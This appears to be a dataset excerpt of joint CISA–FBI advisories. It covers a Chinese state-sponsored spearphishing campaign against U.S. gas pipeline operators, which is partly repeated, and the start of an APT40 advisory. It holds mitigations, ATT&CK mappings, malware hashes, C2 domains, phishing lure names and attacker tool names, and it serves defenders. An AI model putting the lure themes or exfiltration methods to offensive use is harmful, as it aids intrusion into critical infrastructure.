CISA and FBI assess that these intrusions were likely intended to gain strategic access to the ICS networks for future operations rather than for intellectual property theft. This assessment was based on the content of the data that was being exfiltrated and the TTPs used to gain that access. One victim organization set up a honeypot that contained decoy documents with content that appeared to be SCADA-related data and sensitive organizational information. According to this organization, the SCADA-related decoy content was exfiltrated within 15 minutes of the time it was made available in the honeypot. Other sensitive decoy information, including financial and business-related information, was ignored.
CISA and FBI assess that this activity was ultimately intended to help China develop cyberattack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.
Indicators of Compromise
Table 1 lists indicators related to this spearphishing and intrusion campaign as of May 7, 2012, which are provided in this alert for historical completeness.
Table 1: IOCs from Chinese Gas Pipeline Intrusion Campaign, 2011 to 2013



Type
Indicator
Filename


Malware
MD5:84873fae9cdecb84452fff9cca171004  ntshrui.dll
 


Malicious email content, including any attachments and/or message body
fpso.bigish[.]net
 


Malware
MD5:e12ce62cf7de42581c2fe1d7f36d521c  ntshrui.dll
 



User agent string

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
 


User agent string
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
 


Named pipe
ssnp
 


Possible command and control (C2) domain

<xxx>.arrowservice[.]net
Where xxx is the targeted company name abbreviation

 


Malware
MD5:7361a1f33d48802d061605f34bf08fb0  
spoolsvd.exe


Malware
5e6a033fa01739d9b517a468bd812162
AdobeUpdater.exe


Malware
e62afe2273986240746203f9d55496db
ins.exe


Malware
ed92d1242c0017668b93a72865b0876b
px.exe


Malware
6818a9aef22c0c2084293c82935e84fe
gh.exe


Malware
fcbbfadc992e265c351e54598a6f6dfb
fslist.exe


Malware
05476307f4beb3c0d9099270c504f055
u.exe


Malware
54db65a27472c9f3126df5bf91a773ea
slm.exe


Malware
a46a7045c0a3350c5a4c919fff2831a0
niu.exe


Malware
60456fe206a87f5422b214369af4260e
ccApp1.exe


Malware
d6eaadcbcf9ea9192db1bd5bb7462bf8
ntshrui.dll


Malware
52294de74a80beb1e579e5bca7c7248a
moonclient2.exe


Malware
e62afe2273986240746203f9d55496db
inn.exe


Malware
5e6a033fa01739d9b517a468bd812162
kkk.exe


Malware
4a8854363044e4d66bf34a0cd331d93d
inn.exe


Malware
124ad1778c65a83208dbefcec7706dc6
AcroRD32.exe


Malware
17199ddac616938f383a0339f416c890
iass.dll


Malicious email sender address
“(name of victim company official)@yahoo.com”
 


Malicious email content, including any attachments and/or message body
“If not read this paper, pay attention.”
 


Malicious email hyperlinked probable malware
The hyperlink indicated a “.zip” file and contained the words “quality specifications” in reference to a particular component or product unique to the victim U.S. corporation.
 


Malicious email signature block
Contained the name, title, phone number, and corporate email address of an actual victim company official.
 


Malicious attachment name
 
Project-seems-clear-for-takeoff.zip


Possible C2 domain
<xxx>.arrowservice[dot]net
			Where <xxx> may be the full name of the targeted company
 


Possible C2 domain
<xxx>.federalres[.]org
 


Possible C2 domain
<xxx>.businessconsults[.]net
			Where <xxx> may be the targeted company name abbreviation or full name
 


Possible C2 domain
idahoanad[dot]org
 


Possible C2 domain
energyreview.strangled[.]net
 


Possible C2 domain
blackcake[.]net 
 


Possible C2 domain
infosupports[.]com
 


Malware
7caf4dbf53ff1dcd5bd5be92462b2995
iTunesHelper.exe 


Malware
99b58e416c5e8e0bcdcd39ba417a08ed
Solarworldsummary.exe


Malware
f0a00cfd891059b70af96b807e9f9ab8
smss.exe


Malware
ea1b46fab56e7f12c4c2e36cce63d593
AcroRD32.exe


Malicious email content, including any attachments and/or message body 
3d28651bb2d16eeaa6a35099c886fbaa
Election_2012_Analysis.pdf


Possible C2 domain
balancefitstudio[.]com
 


Possible C2 domain
res.federalres[.]org
 


Possible C2 domain
18center[.]com
 


Possible C2 domain
milk.crabdance[.]com
 


Possible C2 domain
bargainblog[.com[.]au
 


Possible C2 domain
etrace-it[.]com
 


Possible C2 domain
picture.wintersline[.]com
 


Possible C2 domain
wish.happyforever[.]com
 


Possible C2 domain
mitchellsrus[.]com
 


Possible C2 domain
un.linuxd[.]org
 


Malicious email content, including any attachments and/or message body 
 
How_Can_Steelmakers_Compete_for_Growth_in_the_Steel_Sector_in_2012.zip


Malicious email content, including any attachments and/or message body 
 
(Company Name)_Summary.zip


Malicious email content, including any attachments and/or message body 
f5369e59a1ddca9b97ede327e98d8ffe
Solarworldsummary.zip


Malicious email content, including any attachments and/or message body 
 
(Company Name)_to_Sell_RNGMS_to_(Company Name).zip


Malicious email content, including any attachments and/or message body 
 
Gift-Winter.zip


Malicious email content, including any attachments and/or message body 
 
Happy_New_Year.zip


Malicious email content, including any attachments and/or message body 
 
Debt_Crisis_Hits_US.zip


Malicious email content, including any attachments and/or message body 
 
01-12-RATEALERT.zip


Malicious email content, including any attachments and/or message body 
fni.itgamezone[.]net
 



 

Mitigations

CISA and the FBI urge Energy Sector and other CI owners and operators to apply the following mitigations to implement a layered, defense-in-depth cyber posture. By implementing a layered approach, administrators will enhance the defensive cyber posture of their OT/ICS networks, reducing the risk of compromise or severe operational degradation if their system is compromised by malicious cyber actors.

Harden the IT/corporate network to reduce the risk of initial compromise.

Update all software, including operating systems, applications, and firmware, in a timely manner. Consider using a centralized patch management system.
Replace all end-of-life software and hardware devices.
Restrict and manage remote access software. Remote access tools are a common method for threat actors to gain initial access and persistence on target networks.

Manage and restrict users and groups who are permitted to access remote capabilities. Permissions should be limited to users that require the capability to complete their duties.
Require multi-factor authentication (MFA) for remote access.
Limit access to resources over networks, especially by restricting Remote Desktop Protocol (RDP). If RDP is operationally necessary, restrict the originating sources and require MFA.


Enable strong spam filters to prevent phishing emails from reaching end users.
Implement unauthorized execution prevention by:

Disabling macro scrips from Microsoft Office files transmitted via email.
Implementing application allowlisting, which only allows systems to execute programs known and permitted by security policy. Implement software restriction policies (SRPs) or other controls to prevent programs from executing from common malware locations, such as temporary folders supporting popular internet browsers.


Filter network traffic to prohibit ingress and egress communications with known malicious IP addresses. Prevent users from accessing malicious websites by implementing URL blocklists and/or allow lists.
Set antivirus/antimalware programs to regularly scan IT network assets using up-to-date signatures.




Implement and ensure robust network segmentation between IT and ICS networks to limit the ability of cyber threat actors to move laterally to ICS networks if the IT network is compromised.

Implement a network topology for ICS that has multiple layers, with the most critical communications occurring in the most secure and reliable layer. For more information refer to National Institute of Standard and Technology (NIST) Special Publication 800-82: Guide to ICS Security.
Use one-way communication diodes to prevent external access, whenever possible.
Set up demilitarized zones (DMZs) to create a physical and logical subnetwork that acts as an intermediary for connected security devices to avoid exposure.
Employ reliable network security protocols and services where feasible.
Consider using virtual local area networks (VLANs) for additional network segmentation, for example, by placing all printers in separate, dedicated VLANs and restricting users’ direct printer access.




Implement perimeter security between network segments to limit the ability of cyber threat actors to move laterally.

Control traffic between network segments by using firewalls, intrusion detection systems (IDSs), and filter routers and switches.
Implement network monitoring at key chokepoints—including egress points to the internet, between network segments, core switch locations—and at key assets or services (e.g., remote access services).
Configure an IDS to create alarms for any ICS traffic outside normal operations (after establishing a baseline of normal operations and network traffic).
Configure security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.




Implement the following additional ICS environment best practices:

Update all software. Use a risk-based assessment strategy to determine which ICS network and assets and zones should participate in the patch management program.

Test all patches in off-line text environments before implementation.


Implement application allowlisting on human machine interfaces.
Harden field devices, including tablets and smartphones.
Replace all end-of-life software and hardware devices.
Disable unused ports and services on ICS devices (after testing to ensure this will not affect ICS operation).
Restrict and manage remote access software. Require MFA for remote access to ICS networks.
Configure encryption and security for ICS protocols.
Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.
Do not allow vendors to connect their devices to the ICS network. Use of a compromised device could introduce malware. 
Maintain an ICS asset inventory of all hardware, software, and supporting infrastructure technologies. 
Ensure robust physical security is in place to prevent unauthorized personal from accessing controlled spaces that house ICS equipment.
Regularly test manual controls so that critical functions can be kept running if ICS/OT networks need to be taken offline.
Manage the supply chain by adjusting the ICS procurement process to weigh cybersecurity heavily as part of the scoring and evaluation methodology. Additionally, establish contractual agreements for all outsourced services that ensure proper incident handling and reporting, security of interconnections, and remote access specifications and processes.




Implement the following additional best practices:

Implement IP geo-blocking, as appropriate.
Implement regular, frequent data backup procedures on both the IT and ICS networks. Data backup procedures should address the following best practices:

Ensure backups are regularly tested.
Store backups separately, i.e., backups should be isolated from network connections that could enable spread of malware or lateral movement.
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt.
Retain backup hardware to rebuild systems in the even rebuilding the primary system is not preferred.


Implement a user training program to train employees to recognize spearphishing attempts, discourage users from visiting malicious websites or opening malicious attachments, and re-enforce appropriate user response to spearphishing emails.



APPENDIX: Tactics and Techniques
Table 2 provides a summary of the MITRE ATT&CK tactics and techniques observed in this campaign.
Table 2: Observed MITRE ATT&CK tactics and techniques



Tactic
Technique


Reconnaissance [TA0043]
Phishing for Information [T1598]


Initial Access [TA0001]
Phishing: Spearphishing Link [T1566.002]


Execution [TA0002]
User Execution: Malicious File [T1204.002]


Discovery [TA0007]
Peripheral Device Discovery [T1120]


Collection [TA0009]
Information from Document Repositories [T1213]


Exfiltration  [TA0010]
 




Revisions

Initial Version: July 20, 2021|July 20, 2021: Corrected ""unknown depth of intrusion"" in Technical Details from 8 to 7.|July 20, 2021: Removed ""Office Viewer"" recommendation since it's deprecated.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1598', 'TA0009', 'T1566.002', 'TA0001', 'TA0007', 'T1213', 'TA0043', 'TA0010', 'TA0002', 'T1120', 'T1204.002'}","




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, Version 9. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Note: CISA released technical information, including indicators of compromise (IOCs), provided in this advisory in 2012 to affected organizations and stakeholders.
This Joint Cybersecurity Advisory—coauthored by the Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI)—provides information on a spearphishing and intrusion campaign conducted by state-sponsored Chinese actors that occurred from December 2011 to 2013, targeting U.S. oil and natural gas (ONG) pipeline companies.
CISA and the FBI provided incident response and remediation support to a number of victims of this activity. Overall, the U.S. Government identified and tracked 23 U.S. natural gas pipeline operators targeted from 2011 to 2013 in this spearphishing and intrusion campaign. Of the known targeted entities, 13 were confirmed compromises, 3 were near misses, and 7 had an unknown depth of intrusion.
The U.S. Government has attributed this activity to Chinese state-sponsored actors. CISA and the FBI assess that these actors were specifically targeting U.S. pipeline infrastructure for the purpose of holding U.S. pipeline infrastructure at risk. Additionally, CISA and the FBI assess that this activity was ultimately intended to help China develop cyberattack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.
This advisory provides information on this campaign, including tactics, techniques, and procedures (TTPs) and IOCs. The TTPs remain relevant to help network defenders protect against intrusions. The IOCs are provided for historical awareness.
CISA and the FBI urge owners and operators of Energy Sector and other critical infrastructure (CI) networks to adopt a heightened state of awareness and implement the recommendations listed in the Mitigations section of this advisory, which include implementing network segmentation between IT and industrial control system (ICS)/operational technology (OT) networks. These mitigations will improve a CI entity’s defensive cyber posture and functional resilience by reducing the risk of compromise or severe operational degradation if the system is compromised by malicious cyber actors, including but not limited to actors associated with the campaign described in this advisory.
For more information on Chinese malicious cyber activity, see us-cert.cisa.gov/china.
Click here for a PDF version of this report.

Technical Details

In April 2012, CISA received reports about targeted attacks directed at multiple ONG pipeline sites; CISA (via a predecessor organization) and FBI provided incident response and remediation support to a number of victims from 2012 to 2013. CISA and FBI’s analysis of the malware and threat actor techniques identified that this activity was related to a spearphishing campaign. The U.S. Government identified and tracked 23 U.S. natural gas pipeline operators targeted in this campaign. Of the 23 known targeted entities, 13 were confirmed compromises, 3 were near misses, and 7 had an unknown depth of intrusion.
Threat Actor Activity
The spearphishing activity appears to have started in late December 2011. From December 9, 2011, through at least February 29, 2012, ONG organizations received spearphishing emails, specifically targeting their employees. The emails were at constructed with a high level of sophistication to convince employees to view malicious files,. Note: see the appendix for a table of the MITRE ATT&CK tactics and techniques observed in this campaign.
In addition to spearphishing, CISA and the FBI were made aware of social engineering attempts by malicious actors believed to be associated with this campaign. The apparent goal was to gain sensitive information from asset owners,. One asset owner reported that individuals in their network engineering department, including managers, received multiple phone calls requesting information about their recent network security practices. Other employees in other departments were not targeted. The asset owner also reported that these calls began immediately after they had identified and removed the malicious intruder from their network and performed a system-wide credential reset. The caller identified himself as an employee of a large computer security firm performing a national survey about network cybersecurity practices. He inquired about the organization’s policy and practices for firewall use and settings, types of software used to protect their network, and the use and type of intrusion detection and/or prevention systems. The caller was blocking his caller ID and when the targeted organization tried to return the call, they reached a number that was not in service.
During the investigation of these compromises, CISA and FBI personnel discovered that Chinese state-sponsored actors specifically collected, and exfiltrated, ICS-related information. The Chinese state-sponsored actors searched document repositories, for the following data types:

Document searches: “SCAD*”
Personnel lists
Usernames/passwords
Dial-up access information
System manuals

Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks. Though designed for legitimate business purposes, these systems have the potential to be manipulated by malicious cyber actors if unmitigated. With this access, the Chinese state-sponsored actors could have impersonated legitimate system operators to conduct unauthorized operations. According to the evidence obtained by CISA and FBI, the Chinese state-sponsored actors made no attempts to modify the pipeline operations of systems they accessed. Note: there was a significant number of cases where log data was not available, and the depth of intrusion and persistent impacts were unable to be determined; at least 8 of 23 cases (35 percent) identified in the campaign were assessed as having an unknown depth of intrusion due to the lack of log data.
CISA and FBI assess that during these intrusions, China was successful in accessing the supervisory control and data acquisition (SCADA) networks at several U.S. natural gas pipeline companies.
Chinese actors also gained information specific to dial-up access, including phone numbers, usernames, and passwords,. Dial-up modems continue to be prevalent in the Energy Sector, providing direct access into the ICS environment with little or no security and no monitoring, which makes them an optimal vector for hold-at-risk operations. The exfiltrated data provided the capabilities for the Chinese cyber actors to access ONG operational systems at a level where they could potentially conduct unauthorized operations.
Exfiltrated Information and Assessed Motives
The Chinese actors specifically targeted information that pertained to access of ICSs. Searches were made for terms involving “SCAD*,” and the actors exfiltrated documents, including personnel lists, usernames and passwords, dial-up access information, remote terminal unit (RTU) sites, and systems manuals. The Chinese actors also exfiltrated information pertaining to ICS permission groups and compromised jump points between corporate and ICS networks. The totality of this information would allow the actors to access ICS networks via multiple channels and would provide sufficient access to allow them to remotely perform unauthorized operations on the pipeline with physical consequences.
CISA and FBI assess that these intrusions were likely intended to gain strategic access to the ICS networks for future operations rather than for intellectual property theft. This assessment was based on the content of the data that was being exfiltrated and the TTPs used to gain that access. One victim organization set up a honeypot that contained decoy documents with content that appeared to be SCADA-related data and sensitive organizational information. According to this organization, the SCADA-related decoy content was exfiltrated within 15 minutes of the time it was made available in the honeypot. Other sensitive decoy information, including financial and business-related information, was ignored.
CISA and FBI assess that this activity was ultimately intended to help China develop cyberattack capabilities against U.S. pipelines to physically damage pipelines or disrupt pipeline operations.
Indicators of Compromise
Table 1 lists indicators related to this spearphishing and intrusion campaign as of May 7, 2012, which are provided in this alert for historical completeness.
Table 1: IOCs from Chinese Gas Pipeline Intrusion Campaign, 2011 to 2013

 

Mitigations

CISA and the FBI urge Energy Sector and other CI owners and operators to apply the following mitigations to implement a layered, defense-in-depth cyber posture. By implementing a layered approach, administrators will enhance the defensive cyber posture of their OT/ICS networks, reducing the risk of compromise or severe operational degradation if their system is compromised by malicious cyber actors.

Harden the IT/corporate network to reduce the risk of initial compromise.

Update all software, including operating systems, applications, and firmware, in a timely manner. Consider using a centralized patch management system.
Replace all end-of-life software and hardware devices.
Restrict and manage remote access software. Remote access tools are a common method for threat actors to gain initial access and persistence on target networks.

Manage and restrict users and groups who are permitted to access remote capabilities. Permissions should be limited to users that require the capability to complete their duties.
Require multi-factor authentication (MFA) for remote access.
Limit access to resources over networks, especially by restricting Remote Desktop Protocol (RDP). If RDP is operationally necessary, restrict the originating sources and require MFA.


Enable strong spam filters to prevent phishing emails from reaching end users.
Implement unauthorized execution prevention by:

Disabling macro scrips from Microsoft Office files transmitted via email.
Implementing application allowlisting, which only allows systems to execute programs known and permitted by security policy. Implement software restriction policies (SRPs) or other controls to prevent programs from executing from common malware locations, such as temporary folders supporting popular internet browsers.


Filter network traffic to prohibit ingress and egress communications with known malicious IP addresses. Prevent users from accessing malicious websites by implementing URL blocklists and/or allow lists.
Set antivirus/antimalware programs to regularly scan IT network assets using up-to-date signatures.




Implement and ensure robust network segmentation between IT and ICS networks to limit the ability of cyber threat actors to move laterally to ICS networks if the IT network is compromised.

Implement a network topology for ICS that has multiple layers, with the most critical communications occurring in the most secure and reliable layer. For more information refer to National Institute of Standard and Technology (NIST) Special Publication 800-82: Guide to ICS Security.
Use one-way communication diodes to prevent external access, whenever possible.
Set up demilitarized zones (DMZs) to create a physical and logical subnetwork that acts as an intermediary for connected security devices to avoid exposure.
Employ reliable network security protocols and services where feasible.
Consider using virtual local area networks (VLANs) for additional network segmentation, for example, by placing all printers in separate, dedicated VLANs and restricting users’ direct printer access.




Implement perimeter security between network segments to limit the ability of cyber threat actors to move laterally.

Control traffic between network segments by using firewalls, intrusion detection systems (IDSs), and filter routers and switches.
Implement network monitoring at key chokepoints—including egress points to the internet, between network segments, core switch locations—and at key assets or services (e.g., remote access services).
Configure an IDS to create alarms for any ICS traffic outside normal operations (after establishing a baseline of normal operations and network traffic).
Configure security incident and event monitoring (SIEM) to monitor, analyze, and correlate event logs from across the ICS network to identify intrusion attempts.




Implement the following additional ICS environment best practices:

Update all software. Use a risk-based assessment strategy to determine which ICS network and assets and zones should participate in the patch management program.

Test all patches in off-line text environments before implementation.


Implement application allowlisting on human machine interfaces.
Harden field devices, including tablets and smartphones.
Replace all end-of-life software and hardware devices.
Disable unused ports and services on ICS devices (after testing to ensure this will not affect ICS operation).
Restrict and manage remote access software. Require MFA for remote access to ICS networks.
Configure encryption and security for ICS protocols.
Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.
Do not allow vendors to connect their devices to the ICS network. Use of a compromised device could introduce malware. 
Maintain an ICS asset inventory of all hardware, software, and supporting infrastructure technologies. 
Ensure robust physical security is in place to prevent unauthorized personal from accessing controlled spaces that house ICS equipment.
Regularly test manual controls so that critical functions can be kept running if ICS/OT networks need to be taken offline.
Manage the supply chain by adjusting the ICS procurement process to weigh cybersecurity heavily as part of the scoring and evaluation methodology. Additionally, establish contractual agreements for all outsourced services that ensure proper incident handling and reporting, security of interconnections, and remote access specifications and processes.




Implement the following additional best practices:

Implement IP geo-blocking, as appropriate.
Implement regular, frequent data backup procedures on both the IT and ICS networks. Data backup procedures should address the following best practices:

Ensure backups are regularly tested.
Store backups separately, i.e., backups should be isolated from network connections that could enable spread of malware or lateral movement.
Maintain regularly updated “gold images” of critical systems in the event they need to be rebuilt.
Retain backup hardware to rebuild systems in the even rebuilding the primary system is not preferred.


Implement a user training program to train employees to recognize spearphishing attempts, discourage users from visiting malicious websites or opening malicious attachments, and re-enforce appropriate user response to spearphishing emails.



APPENDIX: Tactics and Techniques
Table 2 provides a summary of the MITRE ATT&CK tactics and techniques observed in this campaign.
Table 2: Observed MITRE ATT&CK tactics and techniques


Revisions

Initial Version: July 20, 2021|July 20, 2021: Corrected ""unknown depth of intrusion"" in Technical Details from 8 to 7.|July 20, 2021: Removed ""Office Viewer"" recommendation since it's deprecated.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-201a
62,"




Summary

This Joint Cybersecurity Advisory was written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) to provide information on a Chinese Advanced Persistent Threat (APT) group known in open-source reporting as APT40. This advisory provides APT40’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help cybersecurity practitioners identify and remediate APT40 intrusions and established footholds.
APT40—aka BRONZE MOHAWK, FEVERDREAM, G0065, Gadolinium, GreenCrash, Hellsing, Kryptonite Panda, Leviathan, MUDCARP, Periscope, Temp.Periscope, and Temp.Jumper—is located in Haikou, Hainan Province, People’s Republic of China (PRC), and has been active since at least 2009. APT40 has targeted governmental organizations, companies, and universities in a wide range of industries—including biomedical, robotics, and maritime research—across the United States, Canada, Europe, the Middle East, and the South China Sea area, as well as industries included in China’s Belt and Road Initiative.
On July 19, 2021, the U.S. Department of Justice (DOJ) unsealed an indictment against four APT40 cyber actors for their illicit computer network exploitation (CNE) activities via front company Hainan Xiandun Technology Development Company (Hainan Xiandun). Hainan Xiandun employee Wu Shurong cooperated with and carried out orders from PRC Ministry of State Security (MSS) Hainan State Security Department (HSSD) intelligence officers Ding Xiaoyang, Zhu Yunmin, and Cheng Qingmin to conduct CNE. Wu’s CNE activities resulted in the theft of trade secrets, intellectual property, and other high-value information from companies and organizations in the United States and abroad, as well as from multiple foreign governments. These MSS-affiliated actors targeted victims in the following industries: academia, aerospace/aviation, biomedical, defense industrial base, education, government, healthcare, manufacturing, maritime, research institutes, and transportation (rail and shipping).
Click here for a PDF version of this report.
(Updated July 19, 2021) 
Click here for indicators of compromise (IOCs) in STIX format. Note: to uncover malicious activity, incident responders search for IOCs in network- and host-based artifacts and assess the results—eliminating false positives during the assessment. For example, some MD5 IOCs in the STIX file identify legitimate tools—such as Putty, cmd.exe, svchost.exe, etc.—as indicators of compromise. Although the tools themselves are not malicious, APT40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity. If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or to uncover malicious activity. See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance.

Technical Details

This Joint Cybersecurity Advisory uses the MITRE ATT&CK® framework, version 9. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques.
APT40 [G0065] has used a variety of tactics and techniques and a large library of custom and open-source malware—much of which is shared with multiple other suspected Chinese groups—to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data. Table 1 provides details on these tactics and techniques. Note: see the appendix for a list of the domains, file names, and malware MD5 hash values used to facilitate this activity.
Table 1: APT40 ATT&CK Tactics and Techniques





Tactics
Activities and Techniques


 Reconnaissance [TA0043]
			 and
 Resource Development [TA0042]


Gathered victim identity information [T1589] by collecting compromised credentials [T1589.001] 
Acquire infrastructure [T1583] to establish domains that impersonate legitimate entities [T1583.001], aka ‘typosquatting’, to use in watering hole attacks and as command and control (C2) [TA0011] infrastructure
Establish new [T1585.002] and compromise existing [T1586.002] email and social media accounts [1585.001] to conduct social engineering attacks




 Initial Access [TA0001]


External remote services (e.g., virtual private network [VPN] services) [T1133]
Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002]
Drive-by compromises [T1189] and exploitation of public-facing applications [T1190]
Access to valid [T1078], compromised administrative [T1078.001] accounts




 Execution [TA0002]
 

Command and scripting interpreters [T1059] such as PowerShell [T1059.001]
Exploitation of software vulnerabilities in client applications to execute code [T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs)
User execution [T1204] of malicious files [T1204.002] and links [T1566.002] attached to spearphishing emails [T1566.001]




 Persistence [TA0003],
			 Privilege Escalation [TA0004],
			 Credential Access [TA0006],
			 Discovery [TA0007],
			 and
 Lateral Movement [TA0008]

APT40 has used a combination of tool frameworks and malware to establish persistence, escalate privileges, map, and move laterally on victim networks. Additionally, APT40 conducted internal spearphishing attacks [T1534].

BADFLICK/Greencrash
China Chopper [S0020]
Cobalt Strike [S0154]
Derusbi/PHOTO [S0021]
Gh0stRAT [S0032]
GreenRAT
jjdoor/Transporter
jumpkick
Murkytop (mt.exe) [S0233]
NanHaiShu [S0228]
Orz/AirBreak [S0229]
PowerShell Empire [S0363]
PowerSploit [S0194]
Server software component: Web Shell [TA1505.003]




 Defense Evasion [TA0005],
			 Command and Control [TA0011],
			 Collection [TA0009],
			 and
 Exfiltration [TA0010]
 

Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub
Protocol impersonation [T1001.003] by using Application Programming Interface (API) keys for Dropbox accounts in commands to upload stolen data to make it appear that the activity was a legitimate use of the Dropbox service
Protocol tunneling [T1572] and multi-hop proxies [T1090.003], including the use of Tor [S0183]
Use of domain typosquatting for C2 infrastructure [T1583.001]
Archive [T1560], encrypt [T1532], and stage collected data  locally [T1074.001] and remotely [T1074.002] for exfiltration
Exfiltration over C2 channel [T1041]






Mitigations

Network Defense-in-Depth
Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk. The following guidance may assist organizations in developing network defense procedures.
Patch and Vulnerability Management

Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data—such as web browsers, browser plugins, and document readers.
Ensure proper migrating steps or compensating controls are implemented for vulnerabilities that cannot be patched in a timely manner.
Maintain up-to-date antivirus signatures and engines.
Routinely audit configuration and patch management programs to ensure the ability to track and mitigate emerging threats. Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors’ operations and protect resources and information systems.
Review the articles in the References section for more information on Chinese APT exploitation of common vulnerabilities.

Protect Credentials

Strengthen credential requirements, regularly change passwords, and implement multi-factor authentication to protect individual accounts, particularly for webmail and VPN access and for accounts that access critical systems. Do not reuse passwords for multiple accounts. 
Audit all remote authentications from trusted networks or service providers.
Detect mismatches by correlating credentials used within internal networks with those employed on external-facing systems.
Log use of system administrator commands such as net, ipconfig, and ping.
Enforce principle of least privilege.

Network Hygiene and Monitoring

Actively scan and monitor internet-accessible applications for unauthorized access, modification, and anomalous activities. 
Actively monitor server disk use and audit for significant changes.
Log Domain Name Service (DNS) queries and consider blocking all outbound DNS requests that do not originate from approved DNS servers. Monitor DNS queries for C2 over DNS.
Develop and monitor the network and system baselines to allow for the identification of anomalous activity. Audit logs for suspicious behavior.
Identify and suspend access of users exhibiting unusual activity.
Use allowlist or baseline comparison to monitor Windows event logs and network traffic to detect when a user maps a privileged administrative share on a Windows system.
Leverage multi-sourced threat-reputation services for files, DNS, URLs, IP addresses, and email addresses.
Network device management interfaces—such as Telnet, Secure Shell (SSH), Winbox, and HTTP—should be turned off for wide area network (WAN) interfaces and secured with strong passwords and encryption when enabled.
When possible, segment critical information on air-gapped systems. Use strict access control measures for critical data. 

APPENDIX: APT40 Indicators of Compromise

APT40 used the following domains, file names, and malware MD5 hash values to facilitate the CNE activity outlined in this CSA between 2009 through 2018.
 
 
Domains




airbusocean[.]com
https://pastebin[.]com/vfb5mbbu
pacifichydrologic[.]org


cargillnotice[.]com
huntingtomingalls[.]com
philippinenewss[.]com


ccidmeekparry[.]info
indiadigest[.]in
philstarnotice[.]com


ccvzvhjhdf[.]website
jack-newnb[.]com
porndec143.chickenkiller[.]com


cdigroups[.]com
kAty197.chickenkiller[.]com
santaclarasystem[.]us


checkecc[.]com
louisdreyfu[.]com
scsnewstoday[.]com


chemscalere[.]com
mail2.ignorelist[.]com
secbkav[.]com


cnnzapmeta[.]com
masterroot[.]pw
Soure7788.chickenkiller[.]com


corycs[.]com
microsql-update[.]info
tccoll[.]com


deltektimes[.]com
mihybb[.]com
teledynegroup[.]com


Engaction[.]com
mlcdailynews[.]com
teledyneinstrument[.]com


ens-smithjonathan.rhcloud[.]com
movyaction[.]net
testdomain2019.chickenkiller[.]com


fishgatesite.wordpress[.]com
msusanode[.]com
thestar[.]live


goo2k88yyh2.chickenkiller[.]com
newbb-news[.]com
thrivedataview[.]com


gttdoskip[.]com
nfmybb[.]com
thyssemkrupp[.]com


http://gkimertds.wordpress[.]com/feed/
nmw4xhipveaca7hm[.]onion.link/en_US/all.js
thyssenkrupp-marinesystems[.]org


http://stackoverflow[.]com/users/3627469/angle-swift
nobug[.]uk.to
togetno992.mooo[.]com


http://stackoverflow[.]com/users/3804206/swiftr-angle
notesof992.wordpress[.]com
tojenner97.chickenkiller[.]com


http://stackoverflow[.]com/users/3863346/gkimertdssdads
onlinenewspapers[.]club
trafficeco[.]com


vser.mooo[.]com
onlineobl[.]com
transupdate[.]com


https://pastebin[.]com/p1mktQpD
oyukg43t[.]website
troubledate[.]com


ultrasocial[.]info
wsmcoff[.]com
xbug.uk[.]to


usdagroup[.]com
www.yorkshire-espana-sa[.]com/english/servicios/
yootypes[.]com


 
https://github[.]com/slotz/sharp-loader/commit/f9de338fb474fd970a7375030642d04179b9245d
 



 

 
MD5 Malware Hashes
(Updated July 19, 2021) Note: to uncover malicious activity, incident responders search for indicators of compromise (IOCs) in network- and host-based artifacts and assess the results—eliminating false positives during the assessment. For example, some MD5 IOCs in the table below identify legitimate tools—such as PuTTY, cmd.exe, svchost.exe, etc.—as indicators of compromise. Although the tools themselves are not malicious, APT40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity. If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or to uncover malicious activity. See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance.
 





01234c0e41fc23bb5e1946f69e6c6221
018d3c34a296edd32e1b39b7276dcf7f
019b68e26df8750e2f9f580b150b7293
01fa52a4f9268948b6c508fef0377299
022bd2040ec0476d8eb80d1d9dc5cc92
039d9ca446e79f2f4310dc7dcc60ec55
043f6cdca33ce68b1ebe0fd79e4685af
04918772a2a6ccd049e42be16bcbee39
04dc4ca70f788b10f496a404c4903ac6
060067666435370e0289d4add7a07c3b
062c759d04106e46e027bbe3b93f33ef
07083008885d2d0b31b137e896c7266c
079068181a728d0d603fe72ebfc7e910
0803f8c5ee4a152f2108e64c1e7f0233
09143a14272a29c56ff32df160dfdb30
0985f757b1b51533b6c5cf9b1467f388
09aab083fb399527f8ff3065f7796443
